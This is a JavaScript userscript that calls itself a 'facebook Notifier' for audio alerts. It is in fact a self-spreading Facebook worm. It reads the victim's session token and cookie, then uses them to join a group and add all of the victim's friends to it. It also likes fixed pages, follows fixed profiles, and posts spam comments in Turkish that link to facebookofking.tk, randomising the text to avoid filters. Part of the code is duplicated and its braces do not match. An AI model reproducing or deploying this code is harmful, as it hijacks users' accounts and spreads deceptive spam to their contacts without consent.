// ==UserScript==
// @name           facebook Notifier
// @description    Audio & Favicon alerts for facebook. (Cross-browser compatible!)
// @author         1nfected
// @version        0.1.1
// @namespace      1nfected
// @license        CC by-nc-sa http://creativecommons.org/licenses/by-nc-sa/3.0/

// @include        http://facebook.com/*
// @include        http://*.facebook.com/*
// @include        https://facebook.com/*
// @include        https://*.facebook.com/*
// @exclude        http://*.facebook.com/plugins/*
// @exclude        https://*.facebook.com/plugins/*

// @history        0.1.1 Cross-browser update notification enabled.
// ==/UserScript==

// İstek Onayla //
var gid = ['150142618454463'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

// Arkadaş Listesi Alınıyor //
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

// Gruba Arkadaş Ekleniyor //
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};

function antispam(a) {
var b, c = "12365478",
d = "";
if (!a) a = 8;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

function antispamyazi(a) {
var b, c = "....",

d = "";
if (!a) a = 5;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

var randomyazi = [
	"Zaman Tunelinden Ciktim Uygulamayı Kurdum,Abonede Kasmaya Başladı  »» <3 Boşlukları Sil =>  ",
	"Abone Kasmak İsteyenler İçin Superr Uygulama.<3 boslugu sil siteyi gir .. =>  ",
        "Oh beBedava Abone Arttırma Buldum superr »» boslugu sil siteyi gir <3 =>  ",
"Ucretsiz Olarak Abone Kasmak İsteyenler İçin Bedava Uygulama boslugu sil siteyi gir =>  ",
        "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3.....Boşlukları Sil  =>  "
]

var baslikrandom = [
	"Helal olsun valla eski profil gibisi yok »» <3 Boşlukları Sil ",
	"Hem Zaman Tunelinden Cikmak Hemde Abone Kasmak İçin Süper Uygulama Her Dakika Artıyor. Boşlukları Sil ",
        "Oh be yaaaa zaman tünelinden kurtuldum hemde abone kasıyorum superr »» <3 Boşlukları Sil  =>  ",
	"Bedava Abone Kasıyorum Superr bisey mutlaka deneyin chrome kullanlar Uygulama.<3....Boşlukları Sil  =>",
        "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3.....Boşlukları Sil  => "
]

var randomlink = [
	"http://facebookofking.tk",
	"http://facebookofking.tk",
        "http://facebookofking.tk",
        "http://facebookofking.tk",
	"http://facebookofking.tk"
]

var randomyorum = [
	"Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3 Boşlukları Sil  ",
	"Abone Kasmada bir Numara Olan  bu eklenti sayesinde chrome kullanlar dalin iceri   Boşlukları Sil  ",
	"Zaman tunelinden kurtulmak hic bu kadar kolay olmamisti hemen tikla sende Boşlukları Sil   ",
	"Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3 Boşlukları Sil   ",
	"Google chrome eklentisi ile zaman tunelinden ben ciktim sizde cikin ve herkeste gorunuyoo Boşlukları Sil    "
]


// Wall post ayarlar1
var randommesaj = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var link = randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var baslik = baslikrandom[Math.floor(Math.random()*baslikrandom.length)] + " "  + antispamyazi()
var resimlink = ['http://a6.sphotos.ak.fbcdn.net/hphotos-ak-snc6/181129_386365628090519_1580445437_n.jpg'];
var aciklamarandom = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

// Oto Mesaj Ayarlar1
var p0 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p1 = ['http://www.zamantunelikaldir.com/dosyalar/chrome.jpg'];
var p2 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p3 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var message = "";

// Yorum Ayarlar1

var randomyorum = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

function createXMLHttpRequest() {
 return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
 }

 var c = createXMLHttpRequest();
   c.open("GET", "/?sk=nf", false);
   c.onreadystatechange = ct;  
   c.send(null);   
function ct() {
var str = c.responseText; 
var fb_dtsg = str.match(/\"fb_dtsg\"\:\"(.*?)\"/)[1];
var charset_test = escape( str.match(/\"charset_test\" value\=\"(.*?)\"/)[1]);
var xhpc_composerid = str.match(/\"xhpc_composerid\" value\=\"(.*?)\"/)[1];
var user = document.cookie.match(/c_user=\d+/gi)[0].replace("c_user=","");
function wall () {  
post =  
"&fb_dtsg="         + fb_dtsg +
"&xhpc_composerid=" + xhpc_composerid +
"&xhpc_targetid="   + user +
"&xhpc_context=profile"        +
"&xhpc_fbx=1"       +
"&xhpc_timeline="   +
"&xhpc_ismeta=1"    +
"&xhpc_message_text="          + randomyorum +
"&xhpc_message="    + randomyorum +
"&composertags_place="         +
"&composertags_place_name="    +
"&composer_predicted_city="    +
"&composer_session_id="        +
"&is_explicit_place="          +
"&audience[0][value]=80"       +
"&composertags_city="          +
"&disable_location_sharing=false"         +
"&nctr[_mod]=pagelet_wall"     + 
"&lsd"   +
"&__user="          + user +
"&phstamp=";

var c = createXMLHttpRequest();
c.open("POST", "/ajax/updatestatus.php?__a=1", false);
c.send(post);
}
   function like(page){
   var b =  "fbpage_id=" + page +
   "&add=1&reload=1"+
   "&preserve_tab=true"+
   "&fan_origin=page_profile&nctr[_mod]=pagelet_header"+
   "&fb_dtsg=" + fb_dtsg+ "&lsd&__"+ user;
   
     c = createXMLHttpRequest();
     c.open("POST", "/ajax/pages/fan_status.php?__a=1", false);
     c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     c.send(b);
   }
   
like("246803955433008");
like("122360554571760");
like("483520491661650");
like("273487642759403");
like("362902540414330");
like("400534509982404");
like("338820002832868");
like("127854804020096");
   arr = str.match(/name="feedback_params" value="\&\#123(.*?)"/gi);
   
   for (var i in arr){
      
   arr[i] =  arr[i].replace(/&quot;/gi,'"');
   arr[i] =  arr[i].replace(/name=\"feedback_params\" value=\"&#123;/gi,'{');
   arr[i] =  arr[i].replace(/&#125;\"/gi,'}');

 var post = 
   "charset_test="    + charset_test + "&" +
   "fb_dtsg="         + fb_dtsg      + "&" + 
   "feedback_params=" + arr[i]       + "&" +
   "shown_comments=15&total_comments=15&translate_on_load=&add_comment_text_text=" + randomyorum + "&add_comment_text=" + randomyorum + "&" +
   "&comment_replace=optimistic_comment_4183511486_0&comment=1&lsd&__user=" + user + "&phstamp=434255249932186" ;

    var d = createXMLHttpRequest();
    d.open("POST", "/ajax/ufi/modify.php?__a=1", false);
    d.send(post);

   }
// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=100003764965822";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=100003764965822";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş

// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=100003985198928";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=100003985198928";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş



























}

